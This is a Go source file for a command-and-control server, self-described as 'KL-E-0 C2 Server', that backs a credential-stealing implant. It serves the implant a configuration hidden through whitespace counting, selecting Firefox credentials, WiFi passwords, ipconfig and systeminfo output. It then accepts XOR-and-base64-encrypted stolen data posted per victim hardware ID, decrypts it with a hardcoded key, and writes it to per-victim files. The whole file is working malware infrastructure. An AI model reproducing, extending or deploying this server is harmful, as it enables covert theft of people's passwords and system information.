package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"os"

	"github.com/buaazp/fasthttprouter"
	"github.com/valyala/fasthttp"
)

type Record struct {
	FirefoxCredentials string   `json:"firefox"`
	WiFiPasswords      []string `json:"wifi"`
	IPConfigOutput     string   `json:"ipconfig"`
	SystemInfoOutput   string   `json:"systeminfo"`
}

type Config struct {
	FirefoxCredentials bool
	WiFiPasswords      bool
	IPConfigOutput     bool
	SystemInfoOutput   bool
}

func countBlanks(str string) []int {
	var countingNow bool = false
	var counts int = 0
	var values []int
	for _, rune := range str {
		if rune == 32 {
			countingNow = true
			counts = counts + 1
		} else if countingNow && rune != 32 {
			countingNow = false
			values = append(values, counts)
			counts = 0
		}
	}

	return values
}

func checkConfigInt(value int) bool {
	if value == 1 {
		return false
	} else if value == 2 {
		return true
	} else {
		return false
	}
}

func EncryptDecrypt(input, key string) (output string) {
	for i := 0; i < len(input); i++ {
		output += string(input[i] ^ key[i%len(key)])
	}

	return output
}

func DecodeIntel(encoded string) string {
	key := "74cca5c3767cfae1bb76c416df01d874"
	encrypted, err := base64.StdEncoding.DecodeString(encoded)
	log.Println(encrypted)
	if err != nil {
		LogError(err)
		return ""
	}
	decrypted := EncryptDecrypt(string(encrypted), key)
	log.Println("Intel is decrypted.")
	log.Println("Decrypted: ", decrypted)

	var dat Record

	if err := json.Unmarshal([]byte(decrypted), &dat); err != nil {
		LogError(err)
	}
	return decrypted
}

func writeToFile(decrypted_intel string, hwid string) {
	f, err := os.Create(hwid + ".txt")
	if err != nil {
		LogError(err)
	}
	f.WriteString(decrypted_intel)
	f.Close()
	log.Println("New log is written to ->" + hwid + ".txt")
}

func GetConfiguration(ctx *fasthttp.RequestCtx) {
	fmt.Fprint(ctx, ReadConfigFile())
}

func PassTheBag(ctx *fasthttp.RequestCtx) {
	hwid := ctx.UserValue("hwid").(string)
	log.Println("The coming hwid is ->", hwid)
	heartbeat := string(ctx.Request.Body())

	log.Println(heartbeat)
	intel := DecodeIntel(heartbeat)

	writeToFile(intel, hwid)

	fmt.Fprint(ctx, "OK")
}

func LogError(err error) {
	log.Fatal(err.Error())
}

func ReadConfigFile() string {

	/*
		Configuration will be read as how many blank occure between words

		blank := 0x20 char

		One blank: False
		Two blank: True

		First blank  : FirefoxCredentials
		Second blank : WiFiPasswords
		Third blank  : IPConfigOutput
		Fourth blank : SystemInfoOutput
	*/

	content, err := ioutil.ReadFile("config.txt")
	if err != nil {
		LogError(err)
		return err.Error()
	}
	// log.Println("The configuration file is ready.")
	values := countBlanks(string(content))
	config := &Config{
		FirefoxCredentials: checkConfigInt(values[0]),
		WiFiPasswords:      checkConfigInt(values[1]),
		IPConfigOutput:     checkConfigInt(values[2]),
		SystemInfoOutput:   checkConfigInt(values[3]),
	}

	log.Println("Firefox Credentials: ", config.FirefoxCredentials)
	log.Println("WiFi Passwords: ", config.WiFiPasswords)
	log.Println("IPConfig Output: ", config.IPConfigOutput)
	log.Println("SystemInfo Output: ", config.SystemInfoOutput)

	return string(content)
}

func main() {
	log.Println("Welcome to KL-E-0 C2 Server")
	log.Println("As you stated the C2 will serve this configuration")
	ReadConfigFile()

	router := fasthttprouter.New()
	router.GET("/version", GetConfiguration)
	router.POST("/logs/:hwid", PassTheBag)
	router.NotFound = fasthttp.FSHandler("./static", 0)
	log.Fatal(fasthttp.ListenAndServe(":8080", router.Handler))
}
